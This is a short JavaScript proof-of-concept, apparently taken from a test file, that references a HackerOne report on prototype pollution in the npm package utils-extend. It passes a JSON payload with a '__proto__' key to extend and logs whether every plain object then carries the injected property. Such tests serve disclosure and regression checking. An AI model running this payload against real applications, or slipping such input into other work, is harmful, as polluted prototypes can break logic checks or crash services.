// //https://hackerone.com/reports/801522

// test("prototype pollution in utils-extend", () => {
  const { extend } = require("utils-extend");
  const payload = '{"__proto__":{"polluted":"yes"}}';
  obj = {};

console.log({}.polluted);

  const pollutionObject = JSON.parse(payload);
  extend({}, pollutionObject);

console.log({}.polluted);
// });
